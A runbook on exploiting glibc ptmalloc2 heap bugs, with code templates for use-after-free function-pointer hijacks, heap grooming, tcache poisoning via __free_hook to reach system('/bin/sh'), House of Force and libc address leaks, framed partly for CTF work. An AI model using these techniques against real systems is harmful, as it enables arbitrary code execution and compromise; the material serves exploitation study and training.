# Heap and use-after-free exploitation

Heap exploitation requires understanding the allocator. This runbook covers glibc's
ptmalloc2, which is what you encounter on most Linux systems. The primitives are:
use-after-free producing a type confusion or controlled write, and heap overflow
corrupting adjacent chunk metadata.

## Understand the target allocator

```text
# identify libc version (determines allocator behaviour)
ldd ./target | grep libc
strings /lib/x86_64-linux-gnu/libc.so.6 | grep "GNU C Library"

# check for tcache (glibc 2.26+)
# tcache changes exploitation significantly: simpler in some ways, harder in others
```

Glibc 2.26 introduced the tcache (thread-local cache). Tcache bins hold freed chunks
before returning them to the main allocator. A double-free into the tcache is trivially
exploitable in older versions; mitigations were added in 2.27 and hardened further in
2.32+.

## Use-after-free: basic workflow

The pattern: allocate object A, free A, allocate object B of the same size (B occupies
A's memory), use the dangling pointer to A to read or write B's contents.

```c
/* example vulnerable pattern */
struct Obj { char name[32]; void (*print)(struct Obj *); };

struct Obj *a = malloc(sizeof(struct Obj));
strcpy(a->name, "original");
a->print = legitimate_print;

free(a);  // a is now dangling

struct Obj *b = malloc(sizeof(struct Obj));  // same size: likely reuses a's memory
strcpy(b->name, "attacker");
b->print = system;  // overwrite function pointer in b, visible through a

a->print(a);  // UAF: calls through a, which now points to b's data
              // executes system("attacker") if name is /bin/sh
```

In a real target, the goal is:

1. Free a victim object
2. Allocate an attacker-controlled object of the same size
3. Write a fake function pointer, vtable pointer, or other redirect via the dangling
   reference

## Heap grooming

Heap grooming forces allocations to land in predictable locations by controlling the
allocator state before the vulnerability fires.

```python
# generic grooming: drain the tcache bin for size N, then trigger UAF
# so the reallocated memory comes from a predictable location

# step 1: fill the tcache for the target chunk size (7 entries in tcache per size)
victims = []
for _ in range(7):
    victims.append(alloc(SIZE))

# step 2: free all of them to fill the tcache
for v in victims:
    free(v)

# step 3: allocate 8 chunks to drain the tcache (8th comes from fastbin/main)
fresh = []
for _ in range(8):
    fresh.append(alloc(SIZE))

# now tcache for SIZE is empty; next free + alloc will behave predictably
trigger_uaf()
```

In CTF or real targets with a controlled allocation interface, test whether your
grooming produces the expected layout by checking addresses returned by successive
allocations.

## Tcache poisoning (glibc < 2.32)

The tcache free list stores the forward pointer in the first 8 bytes of the freed
chunk. If an attacker can write to a freed chunk (via UAF or heap overflow), they
can overwrite this pointer to redirect the next allocation to an arbitrary address.

```python
# target: overwrite tcache fd to point to __free_hook or __malloc_hook
# these hooks call an attacker-supplied function when triggered

# step 1: allocate and free a chunk to place it in the tcache
chunk = alloc(0x60)
free(chunk)

# step 2: overwrite the tcache fd pointer via UAF
write(chunk, p64(target_addr))  # e.g. libc.__free_hook

# step 3: allocate twice:
# first allocation returns chunk (fd now corrupted)
alloc(0x60)
# second allocation returns target_addr
controlled = alloc(0x60)

# step 4: write to controlled (which is now at __free_hook)
write(controlled, p64(system_addr))

# step 5: trigger: free a chunk containing "/bin/sh"
free(binsh_chunk)  # calls __free_hook(ptr) = system("/bin/sh")
```

In glibc 2.32+, the tcache fd pointer is XOR-mangled with a per-thread key. To
overwrite it correctly, leak the mangling key first (often reachable via a heap
address leak).

## House of Force (glibc without top chunk size check)

If an attacker can overflow into the top chunk size field, the top chunk can be made
arbitrarily large. The next large allocation will then return an address at an
arbitrary offset from the top chunk.

```python
# step 1: overflow into top chunk size field
overflow_to_top_chunk(b'\xff' * 8)  # set top chunk size = -1 (max size_t)

# step 2: allocate a chunk of size (target_addr - current_top - 0x20)
# this positions the next allocation at target_addr
distance = target_addr - top_chunk_addr - 0x20
alloc(distance)

# step 3: the next allocation returns target_addr
write_target = alloc(0x60)
write(write_target, payload)
```

This technique requires no glibc security checks on the top chunk size, which was
added in glibc 2.29.

## Information leak via heap

Most heap exploits need a heap address or libc address before doing controlled
writes. Common sources:

```python
# unsorted bin leak: free a large chunk (> 0x80 bytes, not in tcache)
# the fd/bk pointers of the freed chunk point into the main_arena (libc)
large_chunk = alloc(0x100)
alloc(0x20)   # prevent consolidation with top chunk
free(large_chunk)
# read the first 8 bytes of large_chunk: this is a libc pointer
leak = read(large_chunk, 8)
libc_addr = u64(leak) - libc.symbols['main_arena'] - OFFSET_TO_MAIN_ARENA
libc.address = libc_addr
```

## Debugging heap state

```text
gdb -q ./target
(gdb) heap       # requires pwndbg or peda extension
(gdb) bins       # show tcache, fastbins, unsorted bin contents
(gdb) vis_heap   # visual heap layout (pwndbg)

# manual inspection without extensions
(gdb) x/40gx ADDRESS   # examine 40 quadwords at heap address
```

pwndbg is the recommended gdb extension for heap exploitation:

```text
pip install pwndbg
# or: git clone https://github.com/pwndbg/pwndbg && ./setup.sh
```
